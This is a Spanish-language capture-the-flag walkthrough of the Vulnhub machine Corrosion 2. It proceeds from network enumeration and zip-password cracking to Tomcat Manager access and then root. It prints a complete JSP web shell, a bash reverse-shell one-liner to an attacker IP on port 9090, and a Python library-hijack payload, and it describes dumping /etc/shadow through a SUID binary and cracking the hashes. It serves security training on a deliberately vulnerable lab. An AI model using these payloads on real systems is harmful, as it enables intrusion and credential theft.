#ctf-machine #vulnhub #easy-machine #linux  [Vulnhub  Link](https://www.vulnhub.com/entry/corrosion-2,745/)

## Enumeración inicial
Como no conocemos la IPv4 de nuestra máquina víctima, primeramente hacemos un escaneo ARP con `arp-scan` para identificarla:
![[Pasted image 20240826115857.png]]

Como el OUI de la MAC es "00:0c", que es el que se suele utilizar en máquinas importadas de Vulnhub, podemos decir que la IPv4 de la máquina víctima es "192.168.159.145".

Si lanzamos una traza ICMP a la máquina, vemos que probablemente se trate de un sistema Linux, ya que su TTL es 64 y normalmente las máquinas Linux tienen ese valor de TTL.
![[Pasted image 20240826115953.png]]

### Nmap
Lanzamos un primer escaneo con `nmap` para detectar los puertos TCP abiertos en la máquina:
![[Pasted image 20240826120441.png]]

Como vemos hay 3 puertos abiertos, los puertos 22, 80 y 8080. Así que hacemos un segundo escaneo con `nmap` para detectar la versión y servicio que corren para estos puertos:
![[Pasted image 20240826120623.png]]

Observamos que `nmap` nos reporta versiones de "Apache" y "OpenSSH" de Ubuntu por lo que podemos asegurar que se trata de un sistema Linux. 

Con ayuda de la páquina de "launchpad" podemos identificar provisionalmente de que tipo de Ubuntu es:
![[Pasted image 20240826120826.png]]
![[Pasted image 20240826120904.png]]

Como podemos ver se trata de un Ubuntu Focal.

Hacemos un último escaneo con `nmap` con el objetivo de encontrar algunos directorios en la web de los puertos 80 y 8080:
![[Pasted image 20240826121105.png]]

Como vemos hay diversos directorios, incluido un archivo bastante interesante llamado "backup.zip".


## Enumeración web
Si empezamos descargándonos el archivo "backup.zip" y lo intentamos descomprimir vemos que esta protegido bajo contraseña:
![[Pasted image 20240826121353.png]]

Por lo que podemos probar de *crackerlo* con `john`. Así que primeramente utilizamos la herramienta `zip2john` para que la herramienta `john` pueda intentar *crackearlo*:
![[Pasted image 20240826121639.png]]

Una vez convertido a *hash* utilizamos la herramienta `john` junto al diccionario "rockyou.txt" para intentar averiguar la contraseña:
![[Pasted image 20240826122024.png]]

Como vemos la contraseña es "@administrator_hi5", así que ya podemos descomprimir el archivo zip:
![[Pasted image 20240826122357.png]]

Si enumeramos estos archivos, finalmente en el archivo `tomcat-users.xml` podemos ver unas credenciales:
![[Pasted image 20240826122651.png]]

Así que accedemos a la web para ver donde podríamos utilizarlas. Si accedemos a la web del puerto 8080 vemos la página por defecto de Apache Tomcat:
![[Pasted image 20240826122924.png]]

Podemos intentar acceder al "Manager App" con las credenciales que habíamos encontrado:
![[Pasted image 20240826124457.png]]

Y como vemos, tenemos acceso, por lo que podemos obtener RCE si subimos un archivo "war" con código Java que nos entable una *reverse shell* en el puerto 443. 
![[Pasted image 20240826124847.png]]


Por lo que podemos utilizar crear un archivo "index.jsp" diseñado para que nos dé una *web shell*:
```jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

Una vez creado, creamos un directorio "web-shell" y lo metemos dentro para posteriormente crear el ".war" con Java:
![[Pasted image 20240826125719.png]]

Una vez creado lo subimos mediante la utilidad anterior mostrada:
![[Pasted image 20240826125814.png]]
![[Pasted image 20240826125827.png]]

Como podemos ver ya está subida por lo que si accedemos a `/webshell` obtenemos una *webshell* con la que ejecutar comandos:
![[Pasted image 20240826125919.png]]

Y nos podemos entablar una *reverse shell* ejecutando el comando:
```bash
bash -c $@|bash 0 echo bash -i >& /dev/tcp/192.168.159.131/9090 0>&1
```

> [!NOTE] El comando es algo diferente a lo habitual porque se esta utilizando Java

Y poniéndonos en escucha por el puerto 9090 con `nc` obtenemos la *shell* como "tomcat":
![[Pasted image 20240826143727.png]]

Entonces hacemos el tratamiento de la TTY:
![[Pasted image 20240826143848.png]]
![[Pasted image 20240826143923.png]]


## Escalada de privilegios
Si listamos los usuarios del sistema vemos los siguientes:
![[Pasted image 20240826144307.png]]

Por lo que podemos intentar migrar a otro usuario con la credencial que teníamos de antes. Al intentarlo con el usuario "jaye" obtenemos acceso:
![[Pasted image 20240826144444.png]]

Si acedemos a `/home/randy` podemos visualizar la primera *flag*:
![[Pasted image 20240826144559.png]]

Al buscar por archivos con permisos SUID vemos un archivo extraño:
![[Pasted image 20240826145227.png]]

No tenemos permisos de escritura en este archivo, pero podemos ejecutarlo como *root*:
![[Pasted image 20240826145335.png]]

Investigando un poco como se ejecuta, parece ser un archivo que se encarga de buscar un *string* en un archivo:
![[Pasted image 20240826145755.png]]

Como tenemos permisos de *root* para listar el contenido de archivos podemos listar el contenido del `/etc/shadow`:
![[Pasted image 20240826145930.png]]

Por lo que nos guardamos el `/etc/passwd` de *root* en un archivo "passwd.txt" y el `/etc/shadow` de *root* en un archivo "shadow.txt" para utilizar la herramienta `unshadow` para poder *crackear* con `john` la contraseña:
![[Pasted image 20240826150736.png]]

Una vez generado el *hash*, lo intentamos *crackear* con `john` junto al diccionario "rockyou.txt". Pero no encontramos ninguna contraseña por lo que podemos probar con el usuario "randy":
![[Pasted image 20240826152423.png]]
![[Pasted image 20240826152333.png]]

Nuevamente utilizando `john` junto al diccionario "rockyou.txt":
![[Pasted image 20240826155044.png]]

La contraseña conseguida, la utilizamos para migrar a *randy*:
![[Pasted image 20240826155202.png]]

Si ahora mostramos los permisos a nivel de *sudoers* del usuario "randy" vemos que tiene permisos para ejecutar este archivo con Python3:
![[Pasted image 20240826155237.png]]

Por lo que si mostramos su contenido vemos que utiliza la librería "base64":
![[Pasted image 20240826155309.png]]

No podemos acontecer un *Python Library Hijacking* de primeras porque no tenemos permisos de escritura en el directorio actual:
![[Pasted image 20240826155451.png]]

Pero somos nosotros el propietario por lo que podemos modificar los permisos:
![[Pasted image 20240826155546.png]]

Por lo que si mostramos el *PATH* de Python vemos que lo primero que contempla es el directorio actual por lo que podemos crear un archivo con nombre "base64.py" para acontecer un *Python Library Hijacking*
![[Pasted image 20240826155819.png]]

Si creamos el archivo "base64.py" con este contenido obtendremos una *bash* como *root* al ejecutar el archivo Python con *sudo*:
```python
import os
os.system("bash -p")
```

Si lo ejecutamos obtenemos una *bash* como *root*:
![[Pasted image 20240826160201.png]]

Si finalmente accedemos al directorio `/root` podemos visualizar la última *flag*:
![[Pasted image 20240826160238.png]]



___
#web-enumeration #information-leakage #python-library-hijacking #abusing-sudoers  #hash-cracking #abusing-suid 
___







